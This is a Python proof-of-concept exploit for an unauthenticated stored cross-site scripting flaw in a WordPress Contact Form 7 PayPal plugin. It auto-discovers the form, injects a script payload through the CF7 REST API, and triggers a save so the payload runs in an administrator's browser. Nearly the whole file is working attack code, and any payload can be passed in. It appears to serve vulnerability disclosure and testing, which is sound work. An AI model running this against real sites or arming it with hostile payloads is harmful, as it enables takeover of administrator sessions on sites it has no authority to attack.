#!/usr/bin/env python3
"""
PoC: Unauthenticated Stored XSS in Accept PayPal Payments using Contact Form 7
      (contact-form-7-paypal-extension <= 4.0.6)

Usage:
    python3 poc.py --url=<url-post/page>

What it does:
    1. GETs the public post/page containing the CF7+PayPal form (keeps PHP session).
    2. Auto-discovers the CF7 form ID and field names from the HTML.
    3. Submits the form via the CF7 REST API (/wp-json/contact-form-7/v1/...)
       with an XSS payload in a text field. This makes the plugin store
       `serialize(get_posted_data())` into postmeta `_form_data` and keep
       `$_SESSION[form_instance]`.
    4. GETs /?token=<rand> with the same session to trigger the plugin's
       cancel-flow `action__init()` -> `do_action(.../save/data...)`,
       which persists the payload without requiring any PayPal payment.
    5. Prints how to confirm execution in wp-admin.

Manual confirmation (required, payload executes in admin browser):
    wp-admin > Contact > Paypal Add-on > Transactions > open the new entry.
    The payload fires inside the `cfpe_show_from_data()` meta box.

Only use against systems you are authorized to test.
"""
import argparse
import random
import re
import string
import sys
from urllib.parse import urlparse

try:
    import requests
except ImportedError:
    print("[-] The 'requests' package is required: pip install requests")
    sys.exit(1)

DEFAULT_PAYLOAD = '"><svg onload=alert(1)>'
TIMEOUT = 20
UA = "Mozilla/5.0 (XSS-PoC)"


def rand_token(prefix="cf7pexss"):
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"{prefix}{suffix}"


def wp_bases(page_url, html):
    """Detect WP home base (handles subdirectory installs like /wordpress)."""
    bases = []
    # 1. Exact REST root from <link rel='https://api.w.org/' href='.../wp-json/' />
    m = re.search(
        r'''<link[^>]+rel=['"]https://api\.w\.org/['"][^>]+href=['"]([^'"]+)['"]''',
        html, re.I,
    ) or re.search(
        r'''<link[^>]+href=['"]([^'"]+)['"][^>]+rel=['"]https://api\.w\.org/['"]''',
        html, re.I,
    )
    if m:
        rest_root = m.group(1).split("?")[0].rstrip("/")
        # rest_root = {base}/wp-json  -> base = part before wp-json
        # rest_route style (…/index.php?rest_route=/) has no wp-json: strip index.php
        if "/wp-json" in rest_root:
            base = rest_root.split("/wp-json")[0].rstrip("/")
        else:
            base = rest_root.replace("/index.php", "").rstrip("/")
        if base and base not in bases:
            bases.append(base)
    # 2. Guess from page URL: keep first path segment (e.g. /wordpress)
    #    http://host/wordpress/index.php/poc/ -> http://host/wordpress
    p = urlparse(page_url)
    origin = f"{p.scheme}://{p.netloc}"
    parts = [seg for seg in p.path.split("/") if seg and seg != "index.php"]
    if parts:
        cand = origin + "/" + parts[0]
        # only treat as subdir base if it looks like a WP dir, not a post slug:
        # keep it as candidate anyway, dedup later by trying longest first
        if cand not in bases:
            bases.append(cand)
    # 3. Common fallbacks
    for cand in (origin + "/wordpress", origin):
        if cand not in bases:
            bases.append(cand)
    return bases


def feedback_candidates(bases, form_id):
    urls = []
    for b in bases:
        b = b.rstrip("/")
        urls.append(f"{b}/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback")
        urls.append(f"{b}/index.php?rest_route=/contact-form-7/v1/contact-forms/{form_id}/feedback")
    return urls


def trigger_candidates(bases, token):
    urls = []
    for b in bases:
        b = b.rstrip("/")
        urls.append(f"{b}/?token={token}")
        urls.append(f"{b}/index.php?token={token}")
    return urls


def extract_hidden(html, name, default=""):
    m = re.search(
        r'name="%s"\s+value="([^"]*)"' % re.escape(name), html
    ) or re.search(
        r'value="([^"]*)"\s+[^>]*name="%s"' % re.escape(name), html
    )
    return m.group(1) if m else default


def discover_form(html):
    """Return (form_id, unit_tag, container_post, version, locale, text_fields)."""
    m_id = re.search(r'name="_wpcf7"\s+value="(\d+)"', html)
    if not m_id:
        m_id = re.search(r'value="(\d+)"[^>]*name="_wpcf7"', html)
    form_id = m_id.group(1) if m_id else None
    unit_tag = extract_hidden(html, "_wpcf7_unit_tag")
    container_post = extract_hidden(html, "_wpcf7_container_post", "0")
    version = extract_hidden(html, "_wpcf7_version")
    locale = extract_hidden(html, "_wpcf7_locale", "en_US")

    # collect candidate input/textarea/select names
    names = re.findall(r'<(?:input|textarea|select)[^>]*\sname="([^"]+)"', html, re.I)
    text_fields = []
    for n in names:
        if n.startswith(("_wpcf7", "_wp", "_ajax", "action")):
            continue
        if n in ("g-recaptcha-response", "cf7pe_on_site_payment", "payment_reference"):
            continue
        if n not in text_fields:
            text_fields.append(n)
    return form_id, unit_tag, container_post, version, locale, text_fields


def pick_target_field(text_fields, forced=None):
    if forced:
        return forced
    # prefer message/subject/name-like fields, avoid email fields for the JS payload
    for cand in text_fields:
        low = cand.lower()
        if "mail" in low or "email" in low:
            continue
        if any(k in low for k in ("message", "subject", "name", "text", "desc")):
            return cand
    for cand in text_fields:
        if "mail" not in cand.lower() and "email" not in cand.lower():
            return cand
    return text_fields[0] if text_fields else "your-message"


def main():
    ap = argparse.ArgumentParser(description="Stored XSS PoC for contact-form-7-paypal-extension")
    ap.add_argument("--url", required=True, help="Public post/page URL containing the CF7+PayPal form")
    ap.add_argument("--field", default=None, help="CF7 field name to inject into (auto-detected by default)")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload to store")
    ap.add_argument("--token", default=None, help="Custom token value (random by default)")
    args = ap.parse_args()

    page_url = args.url
    payload = args.payload
    token = args.token or rand_token()
    s = requests.Session()
    s.headers.update({"User-Agent": UA})

    print(f"[*] GET {page_url}")
    try:
        r = s.get(page_url, timeout=TIMEOUT, allow_redirects=True)
    except Exception as e:
        print(f"[-] Failed to fetch page: {e}")
        sys.exit(1)
    if r.status_code != 200:
        print(f"[-] Page returned HTTP {r.status_code}")
        sys.exit(1)

    form_id, unit_tag, container_post, version, locale, text_fields = discover_form(r.text)
    if not form_id:
        print("[-] No CF7 form found on this URL (hidden input _wpcf7 missing).")
        print("    Open the page in a browser and confirm it contains a Contact Form 7 form with PayPal enabled.")
        sys.exit(1)

    target = pick_target_field(text_fields, args.field)
    bases = wp_bases(page_url, r.text)
    print(f"[*] CF7 form ID: {form_id}, unit_tag: {unit_tag or '(empty)'}, container_post: {container_post}")
    print(f"[*] WP bases to try: {bases}")
    print(f"[*] Discovered fields: {text_fields}")
    print(f"[*] Injecting into field: {target}")
    print(f"[*] Payload: {payload}")

    data = {
        "_wpcf7": form_id,
        "_wpcf7_version": version,
        "_wpcf7_locale": locale,
        "_wpcf7_unit_tag": unit_tag,
        "_wpcf7_container_post": container_post,
    }
    # fill discovered fields: payload in target, sane filler elsewhere
    for f in text_fields:
        low = f.lower()
        if f == target:
            data[f] = payload
        elif "mail" in low or "email" in low:
            data[f] = "poc@example.com"
        elif "tel" in low or "phone" in low:
            data[f] = "1234567890"
        elif "url" in low or "website" in low:
            data[f] = "https://example.com"
        elif "number" in low or "amount" in low or "quantity" in low or "price" in low:
            data[f] = "10"
        elif "date" in low:
            data[f] = "2026-01-01"
        elif "check" in low or low.endswith("[]"):
            data[f] = "1"
        else:
            data[f] = f"poc-{rand_token('t')}"
    # ensure amount-like field is non-zero so the plugin does not abort with amount_error
    if not any("amount" in f.lower() or "price" in f.lower() for f in text_fields):
        pass  # site may use a fixed amount; submission still proceeds

    print(f"[*] Trying {len(feedback_candidates(bases, form_id))} feedback endpoint candidates...")
    pr = None
    used_feedback = None
    for feedback_url in feedback_candidates(bases, form_id):
        print(f"[*] POST {feedback_url}")
        try:
            # CF7 REST rejects application/x-www-form-urlencoded (415);
            # it requires multipart/form-data, so send via files.
            multipart = {k: (None, v) for k, v in data.items()}
            pr = s.post(feedback_url, files=multipart, timeout=TIMEOUT)
        except Exception as e:
            print(f"[!] POST failed: {e}, trying next...")
            continue
        print(f"[*] Feedback HTTP {pr.status_code}")
        if pr.status_code == 404:
            print("[!] 404, trying next candidate...")
            continue
        if pr.status_code == 415:
            print("[!] 415 unsupported media type, trying next candidate...")
            continue
        used_feedback = feedback_url
        break
    if pr is None:
        print("[-] All feedback POSTs failed.")
        sys.exit(1)
    try:
        j = pr.json()
        print(f"[*] CF7 status: {j.get('status')}, message: {j.get('message')}")
        if j.get("status") not in ("mail_sent", "mail_failed"):
            print(f"[!] Unexpected CF7 status; the form may need different filler values. Raw: {str(j)[:500]}")
    except Exception:
        print(f"[!] Non-JSON feedback response (first 300 chars): {pr.text[:300]}")

    # Trigger the cancel-flow save: requires the same PHP session that holds form_instance.
    tr = None
    for trigger_url in trigger_candidates(bases, token):
        print(f"[*] GET {trigger_url} (cancel-flow save, same session)")
        try:
            tr = s.get(trigger_url, timeout=TIMEOUT, allow_redirects=True)
            print(f"[*] Trigger HTTP {tr.status_code}, session cookies: {s.cookies.get_dict()}")
            if tr.status_code != 404:
                break
        except Exception as e:
            print(f"[!] Trigger GET failed: {e}, trying next...")
            continue
    if tr is None:
        print("[-] All trigger GETs failed.")
        sys.exit(1)

    print("")
    print("[+] Done. The payload is now stored as `_form_data` if the form has PayPal enabled")
    print("    and the PayPal API call succeeded (normal on a configured site).")
    print("[+] Confirm as admin: wp-admin > Contact > Paypal Add-on > Transactions > open newest entry.")
    print(f"    Look for: {payload}")
    print("    It renders unescaped inside the 'From Data' meta box and executes in the admin browser.")


if __name__ == "__main__":
    main()
